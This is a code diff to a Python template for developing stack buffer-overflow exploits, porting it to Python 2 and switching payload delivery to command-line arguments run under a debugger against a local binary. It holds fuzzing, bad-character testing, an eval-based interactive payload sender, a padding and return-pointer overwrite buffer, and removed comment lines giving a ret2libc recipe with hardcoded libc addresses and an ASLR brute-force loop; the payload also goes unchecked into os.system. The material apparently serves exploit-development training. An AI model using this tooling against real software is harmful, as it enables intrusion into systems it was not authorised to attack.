@@ -1,4 +1,5 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
+# -*- coding: latin-1 -*-
 
 # This is a Python based template to be used in
 # developing stack based buffer-overflow explitation
@@ -11,6 +12,7 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 import os
+import binascii
 
 EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE = 1
 EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE = 1024 * 5
@@ -20,7 +22,7 @@ CHANNEL_TYPE_SOCKET = 1
 CHANNEL_TYPE_HTTP = 2
 CHANNEL_TYPE_ARG = 3
 
-channel_type = CHANNEL_TYPE_SOCKET
+channel_type = CHANNEL_TYPE_ARG
 
 target_host = "localhost"
 target_port = 31337
@@ -37,8 +39,8 @@ socket_recv_buffer = 1024
 wait_for_response = True
 debug = True
 
-payload_prefix = b""
-payload_suffix = b"\n"
+payload_prefix = ""
+payload_suffix = "\n"
 
 STATUS_SUCCESS = "success"
 STATUS_TIMEOUT = "timeout"
@@ -112,7 +114,8 @@ def send_socket(payload):
     s.close()
 
 def send_args(payload):
-    os.system('edb --run /mnt/hgfs/_vm_share/overfw ' + str(payload))
+    print(payload)
+    os.system('edb --run /mnt/hgfs/_vm_share/overfw ' + payload)
 
 def build_final_payload(payload):
     if channel_type == CHANNEL_TYPE_SOCKET:
@@ -169,19 +172,19 @@ def send_payload(payload):
 def interactive():
     while True:
         print("")
-        user_input = input("INPUT ('py:' for python expr, 'exit:' to stop) > ")
+        user_input = raw_input("INPUT ('py:' for python expr, 'exit:' to stop) > ")
         if (user_input.startswith("exit:")):
             break
         if (user_input.startswith("py:")):
             user_input = eval(user_input[3:])
-        send_payload(user_input.encode("utf-8"))
+        send_payload(user_input)
 
 
 def detect_timeout():
     for i in range(EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE, EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE):
         value = i * 100
         print("Trying: ", value)
-        status = send_payload(("A" * value).encode("utf-8"))
+        status = send_payload("A" * value)
         if (status == STATUS_TIMEOUT or status == STATUS_ERROR):
             print("Stopped at: ", value)
             break
@@ -213,32 +216,15 @@ def exploit():
     #  >>> struct.pack("<I", 3737844653)
     #  '\xAD\xFB\xCA\xDE'
 
-    # gdb-peda$ pattern_create 500
-    # gdb-peda$ pattern_offset AA8A
-    # gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`
-    # ldd /usr/local/bin/ovrflw | grep libc
-    # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
-    # strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
-    #
-    # exit_loc = 0xb75f8000+0x33260
-    # system_loc = 0xb75f8000+0x40310
-    # bin_sh_loc  = 0xb75f8000+0x162bac
-    #
-    # When ASLR is enabled:
-    # while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
-
-    # cat /proc/sys/kernel/randomize_va_space
-    # 0 - no / 1 -  Shared libraries, stack, mmap(), VDSO and heap are randomized. / 2 - full (brk())
-
     buf_totlen = 1024
     offset_srp = 146
 
-    buf = b""
-    buf += b"A" * (offset_srp - len(buf))    # padding
-    buf += b"BBBB"                           # SavedReturnPointer (SRP) overwrite : buf += struct.pack("<I", ptr_jmp_esp)
-    buf += b"CCCC"                           # ESP should end up pointing here "\xCC\xCC\xCC\xCC" 
-    buf += b"D" * (buf_totlen - len(buf))    # trailing padding
-    buf += b"\n"
+    buf = ""
+    buf += "A" * (offset_srp - len(buf))    # padding
+    buf += "BBBB"                           # SavedReturnPointer (SRP) overwrite : buf += struct.pack("<I", ptr_jmp_esp)
+    buf += "CCCC"                           # ESP should end up pointing here "\xCC\xCC\xCC\xCC" 
+    buf += "D" * (buf_totlen - len(buf))    # trailing padding
+    buf += "\n"
 
     send_payload(buf)
 
@@ -256,7 +242,7 @@ def main():
             print("7 - find_bad_chars")
             print("9 - exploit")
 
-        option = input("Option > ")
+        option = str(raw_input("Option > "))
         print_header = True
         if (option == "1"):
             interactive()
@@ -292,7 +278,7 @@ def main():
         elif (option.startswith("7")):
             section_splits = option.split(" - ")
             filler_splits = section_splits[0].split(" ")[1:]
-            badchar_test = b""
+            badchar_test = ""
             try:
                 badchar_splits = []
                 if len(section_splits) > 1:
@@ -315,7 +301,7 @@ def main():
             except IndexError:
                 print("No removals")
             if len(filler_splits) >= 1 and filler_splits[0].startswith("*"):
-                filler = b"A" * (int(filler_splits[0].split("*")[1]) - len(badchar_test))
+                filler = "A" * (int(filler_splits[0].split("*")[1]) - len(badchar_test))
                 payload = filler + badchar_test
             else:
                 payload = build_filler_payload(filler_splits) + badchar_test
